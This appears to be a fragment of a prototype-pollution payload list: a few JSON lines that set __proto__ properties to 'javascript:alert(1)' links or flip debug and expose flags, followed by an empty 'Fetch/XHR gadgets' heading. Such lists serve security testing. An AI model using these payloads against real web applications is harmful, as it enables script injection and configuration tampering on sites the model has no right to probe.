{"__proto__": {"href": "javascript:alert(1)"}}
{"__proto__": {"url": "javascript:alert(1)"}}

# Configuration override
{"__proto__": {"debug": true}}
{"__proto__": {"expose": true}}

# Fetch/XHR gadgets
